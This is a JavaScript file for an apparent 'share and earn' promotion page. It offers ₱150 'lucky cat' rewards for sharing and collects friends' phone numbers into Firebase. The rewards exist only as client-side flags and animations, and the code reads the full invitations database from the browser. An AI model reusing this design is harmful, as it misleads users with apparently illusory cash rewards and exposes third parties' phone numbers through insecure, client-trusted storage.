// ========== PROMOTION.JS - SHARE AND EARN ==========

// ========== GLOBAL VARIABLES ==========
var leftRewardClaimed = false;
var rightRewardAmount = 0;        // Total na pwedeng i-claim sa right cat (150 per accepted invite)
var rightRewardClaimed = 0;       // Ilan na ang na-claim
var remainingInvites = 6;
var acceptedInvitesCount = 0;

// ========== INITIALIZE PARTICIPANT ==========
async function initParticipant() {
    var phone = localStorage.getItem("userPhone");
    if (!phone) return;
    
    if (typeof firebase !== 'undefined' && firebase.database) {
        var db = firebase.database();
        var participantRef = db.ref('participants/' + phone);
        var snapshot = await participantRef.once('value');
        
        if (!snapshot.exists()) {
            // New participant
            await participantRef.set({
                phone: phone,
                firstVisit: Date.now(),
                lastActive: Date.now(),
                totalInvites: 0,
                acceptedInvites: 0,
                remainingInvites: 6,
                leftRewardClaimed: false,
                rightRewardClaimed: 0,
                rightRewardTotal: 0
            });
            remainingInvites = 6;
            acceptedInvitesCount = 0;
            rightRewardAmount = 0;
        } else {
            // Existing participant
            var data = snapshot.val();
            remainingInvites = data.remainingInvites || 6;
            acceptedInvitesCount = data.acceptedInvites || 0;
            leftRewardClaimed = data.leftRewardClaimed || false;
            rightRewardClaimed = data.rightRewardClaimed || 0;
            rightRewardAmount = acceptedInvitesCount * 150;  // 150 per accepted invite
            
            // Update UI based on saved data
            updateLeftCardVisual();
            updateRightCardVisual();
        }
    }
}

// ========== CREATE INVITATION ==========
async function createInvitation(friendPhone) {
    var userPhone = localStorage.getItem("userPhone");
    if (!userPhone) return false;
    
    if (typeof firebase !== 'undefined' && firebase.database) {
        var db = firebase.database();
        
        // Check remaining invites
        var participantSnap = await db.ref('participants/' + userPhone).once('value');
        var remaining = participantSnap.exists() ? participantSnap.val().remainingInvites : 6;
        
        if (remaining <= 0) {
            alert("You have reached the maximum of 6 invites!");
            return false;
        }
        
        // Check if already invited this person
        var inviteRef = db.ref('invitations/' + userPhone + '/' + friendPhone);
        var existingInvite = await inviteRef.once('value');
        
        if (existingInvite.exists()) {
            alert("You already invited this person!");
            return false;
        }
        
        // Create invitation
        await inviteRef.set({
            invitedBy: userPhone,
            invitedPhone: friendPhone,
            timestamp: Date.now(),
            status: 'pending'
        });
        
        // Update participant invites count
        var newRemaining = remaining - 1;
        await db.ref('participants/' + userPhone).update({
            totalInvites: (participantSnap.val().totalInvites || 0) + 1,
            remainingInvites: newRemaining,
            lastActive: Date.now()
        });
        
        remainingInvites = newRemaining;
        return true;
    }
    return false;
}

// ========== ACCEPT INVITATION (User2 nag-accept) ==========
async function acceptInvitation(inviterPhone) {
    var currentUserPhone = localStorage.getItem("userPhone");
    if (!currentUserPhone) return false;
    
    if (typeof firebase !== 'undefined' && firebase.database) {
        var db = firebase.database();
        
        // Update invitation status
        var inviteRef = db.ref('invitations/' + inviterPhone + '/' + currentUserPhone);
        await inviteRef.update({
            status: 'accepted',
            acceptedAt: Date.now()
        });
        
        // Update inviter's accepted invites count
        var inviterRef = db.ref('participants/' + inviterPhone);
        var inviterSnap = await inviterRef.once('value');
        
        if (inviterSnap.exists()) {
            var newAccepted = (inviterSnap.val().acceptedInvites || 0) + 1;
            var newRightTotal = newAccepted * 150;
            
            await inviterRef.update({
                acceptedInvites: newAccepted,
                rightRewardTotal: newRightTotal,
                lastActive: Date.now()
            });
            
            // If this is the current user, update their right reward amount
            if (inviterPhone === localStorage.getItem("userPhone")) {
                acceptedInvitesCount = newAccepted;
                rightRewardAmount = newRightTotal;
                updateRightCardVisual();
                
                // Show notification
                var statusMsg = document.getElementById('statusMessage');
                if (statusMsg) {
                    statusMsg.innerHTML = '🎉 A friend accepted your invite! +₱150 available on FRIEND GETS card!';
                }
            }
        }
        
        return true;
    }
    return false;
}

// ========== LEFT LUCKY CAT (YOU GET - One time ₱150) ==========
function initLeftLuckyCat() {
    var leftCard = document.querySelector('.prize-card:first-child');
    if (!leftCard) return;
    
    if (leftRewardClaimed) {
        // Already claimed - permanent golden sunray
        leftCard.style.border = '3px solid #ffd700';
        leftCard.style.boxShadow = '0 0 30px rgba(255,215,0,0.7), 0 0 15px rgba(255,215,0,0.4)';
        leftCard.style.cursor = 'default';
        leftCard.style.background = 'radial-gradient(circle, rgba(255,215,0,0.15), rgba(255,215,0,0.05))';
    } else {
        // Not claimed yet
        leftCard.style.cursor = 'pointer';
        leftCard.style.transition = 'all 0.3s ease';
        
        // Hover effect - sunray golden aura
        leftCard.addEventListener('mouseenter', function() {
            if (!leftRewardClaimed) {
                this.style.border = '2px solid #ffd700';
                this.style.boxShadow = '0 0 30px rgba(255,215,0,0.6), 0 0 15px rgba(255,215,0,0.3)';
                this.style.transform = 'scale(1.02)';
            }
        });
        
        leftCard.addEventListener('mouseleave', function() {
            if (!leftRewardClaimed) {
                this.style.border = '1px solid rgba(255,215,0,0.3)';
                this.style.boxShadow = '0 0 10px rgba(255,215,0,0.2)';
                this.style.transform = 'scale(1)';
            }
        });
        
        leftCard.addEventListener('click', function(e) {
            e.stopPropagation();
            
            if (leftRewardClaimed) {
                alert("You already claimed your ₱150!");
                return;
            }
            
            // Get position for floating animation
            var rect = this.getBoundingClientRect();
            var x = rect.left + rect.width / 2;
            var y = rect.top + rect.height / 2;
            
            // Mark as claimed
            leftRewardClaimed = true;
            
            // Update Firebase
            var phone = localStorage.getItem("userPhone");
            if (typeof firebase !== 'undefined' && firebase.database) {
                var db = firebase.database();
                db.ref('participants/' + phone).update({
                    leftRewardClaimed: true,
                    leftRewardAmount: 150,
                    leftRewardClaimedAt: Date.now()
                });
            }
            
            // Update UI - permanent golden sunray effect
            this.style.border = '3px solid #ffd700';
            this.style.boxShadow = '0 0 35px rgba(255,215,0,0.8), 0 0 20px rgba(255,215,0,0.5)';
            this.style.cursor = 'default';
            this.style.background = 'radial-gradient(circle, rgba(255,215,0,0.2), rgba(255,215,0,0.05))';
            
            // Show floating +150
            showFloatingPlus(x, y, 150);
            startConfetti();
            
            // Update progress bar
            var progressFill = document.getElementById('progressFill');
            if (progressFill) progressFill.style.width = '33%';
            
            var statusMsg = document.getElementById('statusMessage');
            if (statusMsg) {
                statusMsg.innerHTML = '🎉 +₱150 claimed! Invite friends to get more from FRIEND GETS card!';
            }
            
            console.log("Left Lucky Cat claimed! +₱150");
        });
    }
}

// ========== RIGHT LUCKY CAT (FRIEND GETS - ₱150 per accepted invite) ==========
function initRightLuckyCat() {
    var rightCard = document.querySelector('.prize-card:last-child');
    if (!rightCard) return;
    
    // Calculate available reward (acceptedInvitesCount * 150) - already claimed
    var availableReward = rightRewardAmount - (rightRewardClaimed * 150);
    
    function updateRightCardDisplay() {
        var available = rightRewardAmount - (rightRewardClaimed * 150);
        
        if (available <= 0 && rightRewardAmount > 0) {
            // All rewards claimed - permanent golden sunray
            rightCard.style.border = '3px solid #ffd700';
            rightCard.style.boxShadow = '0 0 30px rgba(255,215,0,0.7)';
            rightCard.style.cursor = 'default';
            rightCard.style.background = 'radial-gradient(circle, rgba(255,215,0,0.15), rgba(255,215,0,0.05))';
            rightCard.style.opacity = '0.8';
        } else if (rightRewardAmount > 0) {
            // Has available rewards - pulsating golden sunray
            rightCard.style.border = '2px solid #ffd700';
            rightCard.style.boxShadow = '0 0 25px rgba(255,215,0,0.5)';
            rightCard.style.cursor = 'pointer';
            rightCard.style.animation = 'pulseGold 1.5s infinite';
            rightCard.style.background = 'radial-gradient(circle, rgba(255,215,0,0.1), transparent)';
        } else {
            // No rewards yet - subtle glow
            rightCard.style.border = '1px solid rgba(255,215,0,0.2)';
            rightCard.style.boxShadow = '0 0 5px rgba(255,215,0,0.1)';
            rightCard.style.cursor = 'default';
            rightCard.style.animation = 'none';
        }
    }
    
    // Hover effect only if rewards available
    rightCard.addEventListener('mouseenter', function() {
        var available = rightRewardAmount - (rightRewardClaimed * 150);
        if (available > 0 && rightRewardAmount > 0) {
            this.style.boxShadow = '0 0 40px rgba(255,215,0,0.8), 0 0 20px rgba(255,215,0,0.4)';
            this.style.transform = 'scale(1.02)';
        }
    });
    
    rightCard.addEventListener('mouseleave', function() {
        var available = rightRewardAmount - (rightRewardClaimed * 150);
        if (available > 0 && rightRewardAmount > 0) {
            this.style.boxShadow = '0 0 25px rgba(255,215,0,0.5)';
            this.style.transform = 'scale(1)';
        } else if (rightRewardAmount > 0) {
            this.style.boxShadow = '0 0 25px rgba(255,215,0,0.5)';
            this.style.transform = 'scale(1)';
        } else {
            this.style.boxShadow = '0 0 5px rgba(255,215,0,0.1)';
            this.style.transform = 'scale(1)';
        }
    });
    
    rightCard.addEventListener('click', function(e) {
        e.stopPropagation();
        
        var available = rightRewardAmount - (rightRewardClaimed * 150);
        
        if (rightRewardAmount === 0) {
            alert("No rewards yet! Invite friends to earn ₱150 each.");
            return;
        }
        
        if (available <= 0) {
            alert("You already claimed all your rewards from invites!");
            return;
        }
        
        // Claim one reward (₱150)
        var rect = this.getBoundingClientRect();
        var x = rect.left + rect.width / 2;
        var y = rect.top + rect.height / 2;
        
        rightRewardClaimed++;
        var newAvailable = rightRewardAmount - (rightRewardClaimed * 150);
        
        // Update Firebase
        var phone = localStorage.getItem("userPhone");
        if (typeof firebase !== 'undefined' && firebase.database) {
            var db = firebase.database();
            db.ref('participants/' + phone).update({
                rightRewardClaimed: rightRewardClaimed,
                lastClaimAt: Date.now()
            });
        }
        
        // Show floating +150
        showFloatingPlus(x, y, 150);
        startConfetti();
        
        // Update card visual
        updateRightCardDisplay();
        
        // Update progress bar
        var progressFill = document.getElementById('progressFill');
        if (progressFill) {
            var totalSteps = (rightRewardAmount / 150) + (leftRewardClaimed ? 1 : 0);
            var completedSteps = rightRewardClaimed + (leftRewardClaimed ? 1 : 0);
            var percent = (completedSteps / totalSteps) * 100;
            progressFill.style.width = Math.min(percent, 100) + '%';
        }
        
        var statusMsg = document.getElementById('statusMessage');
        if (statusMsg) {
            statusMsg.innerHTML = '🎉 +₱150 claimed! ' + (newAvailable > 0 ? newAvailable + ' more available!' : 'All rewards claimed!');
        }
        
        console.log("Right Lucky Cat claimed! +₱150. Remaining: " + newAvailable);
    });
    
    updateRightCardDisplay();
}

function updateRightCardVisual() {
    var rightCard = document.querySelector('.prize-card:last-child');
    if (!rightCard) return;
    
    var available = rightRewardAmount - (rightRewardClaimed * 150);
    
    if (available <= 0 && rightRewardAmount > 0) {
        rightCard.style.border = '3px solid #ffd700';
        rightCard.style.boxShadow = '0 0 30px rgba(255,215,0,0.7)';
        rightCard.style.cursor = 'default';
        rightCard.style.background = 'radial-gradient(circle, rgba(255,215,0,0.15), rgba(255,215,0,0.05))';
    } else if (rightRewardAmount > 0) {
        rightCard.style.border = '2px solid #ffd700';
        rightCard.style.boxShadow = '0 0 25px rgba(255,215,0,0.5)';
        rightCard.style.cursor = 'pointer';
        rightCard.style.animation = 'pulseGold 1.5s infinite';
    } else {
        rightCard.style.border = '1px solid rgba(255,215,0,0.2)';
        rightCard.style.boxShadow = '0 0 5px rgba(255,215,0,0.1)';
        rightCard.style.cursor = 'default';
        rightCard.style.animation = 'none';
    }
}

function updateLeftCardVisual() {
    var leftCard = document.querySelector('.prize-card:first-child');
    if (!leftCard) return;
    
    if (leftRewardClaimed) {
        leftCard.style.border = '3px solid #ffd700';
        leftCard.style.boxShadow = '0 0 30px rgba(255,215,0,0.7), 0 0 15px rgba(255,215,0,0.4)';
        leftCard.style.cursor = 'default';
        leftCard.style.background = 'radial-gradient(circle, rgba(255,215,0,0.15), rgba(255,215,0,0.05))';
    }
}

// ========== FLOATING +150 ANIMATION ==========
function showFloatingPlus(x, y, amount) {
    var floatingDiv = document.createElement('div');
    floatingDiv.className = 'floating-plus';
    floatingDiv.innerHTML = '+₱' + amount;
    floatingDiv.style.position = 'fixed';
    floatingDiv.style.left = x + 'px';
    floatingDiv.style.top = y + 'px';
    floatingDiv.style.color = '#ffd700';
    floatingDiv.style.fontSize = '36px';
    floatingDiv.style.fontWeight = 'bold';
    floatingDiv.style.fontFamily = 'Orbitron, monospace';
    floatingDiv.style.textShadow = '0 0 15px #ffaa33';
    floatingDiv.style.pointerEvents = 'none';
    floatingDiv.style.zIndex = '10001';
    floatingDiv.style.animation = 'floatUp 1s ease-out forwards';
    
    document.body.appendChild(floatingDiv);
    
    setTimeout(function() {
        floatingDiv.remove();
    }, 1000);
}

// ========== SHARE BUTTON ==========
async function handleShare() {
    var friendPhone = document.getElementById('friendPhoneInput').value.trim();
    var userPhone = localStorage.getItem("userPhone");
    
    if (!friendPhone || friendPhone.length !== 11 || !friendPhone.startsWith('09')) {
        alert("Please enter valid 11-digit number starting with 09");
        return;
    }
    
    if (friendPhone === userPhone) {
        alert("You cannot invite yourself!");
        return;
    }
    
    var success = await createInvitation(friendPhone);
    
    if (success) {
        document.getElementById('friendPhoneInput').value = '';
        
        var statusMsg = document.getElementById('statusMessage');
        if (statusMsg) {
            statusMsg.innerHTML = '✅ Invitation sent! Remaining invites: ' + remainingInvites;
        }
        
        alert("Invitation sent to " + friendPhone);
    }
}

// ========== CHECK EXISTING INVITES ==========
async function checkExistingInvites() {
    var phone = localStorage.getItem("userPhone");
    if (!phone) return;
    
    if (typeof firebase !== 'undefined' && firebase.database) {
        var db = firebase.database();
        
        var invitesRef = db.ref('invitations');
        var snapshot = await invitesRef.once('value');
        
        if (snapshot.exists()) {
            var invites = snapshot.val();
            for (var inviter in invites) {
                if (invites[inviter][phone] && invites[inviter][phone].status === 'pending') {
                    await acceptInvitation(inviter);
                    console.log("Auto-accepted invitation from: " + inviter);
                }
            }
        }
    }
}

// ========== CSS ANIMATION FOR PULSE GOLD ==========
function addPulseGoldAnimation() {
    if (!document.querySelector('#pulseGoldStyle')) {
        var style = document.createElement('style');
        style.id = 'pulseGoldStyle';
        style.textContent = `
            @keyframes pulseGold {
                0% { box-shadow: 0 0 5px rgba(255,215,0,0.3); }
                50% { box-shadow: 0 0 35px rgba(255,215,0,0.8), 0 0 15px rgba(255,215,0,0.5); }
                100% { box-shadow: 0 0 5px rgba(255,215,0,0.3); }
            }
            @keyframes floatUp {
                0% { opacity: 1; transform: translateY(0) scale(1); }
                50% { opacity: 1; transform: translateY(-50px) scale(1.2); }
                100% { opacity: 0; transform: translateY(-100px) scale(1.5); }
            }
        `;
        document.head.appendChild(style);
    }
}

// ========== INITIALIZE ==========
document.addEventListener('DOMContentLoaded', async function() {
    console.log("Promotion.js loading...");
    
    addPulseGoldAnimation();
    
    var userPhone = localStorage.getItem("userPhone");
    var display = document.getElementById('userPhoneDisplay');
    if (display) {
        display.innerText = userPhone || 'Not logged in';
    }
    
    if (!userPhone) {
        alert("Please login first.");
        window.location.href = "index.html";
        return;
    }
    
    await initParticipant();
    await checkExistingInvites();
    
    initMainTimer();
    initWinnerTicker();
    initLeftLuckyCat();
    initRightLuckyCat();
    initShareButton();
    
    var fbBtn = document.getElementById('shareFBBtn');
    if (fbBtn) {
        fbBtn.onclick = function() {
            var shareUrl = "https://xjiligames.github.io/rewards/index.html";
            window.open('https://www.facebook.com/sharer/sharer.php?u=' + encodeURIComponent(shareUrl), '_blank');
        };
    }
    
    var claimBtn = document.getElementById('claimGCashBtn');
    if (claimBtn) {
        claimBtn.onclick = function() {
            alert("💰 Please click the LUCKY CAT cards to claim your rewards!");
        };
    }
    
    var friendInput = document.getElementById('friendPhoneInput');
    var shareBtn = document.getElementById('shareButton');
    if (friendInput && shareBtn) {
        friendInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                e.preventDefault();
                shareBtn.click();
            }
        });
    }
    
    var video = document.querySelector('.lucky-cat-video video');
    if (video) {
        video.play().catch(function(e) { console.log("Autoplay blocked:", e); });
    }
    
    console.log("Promotion.js ready");
});
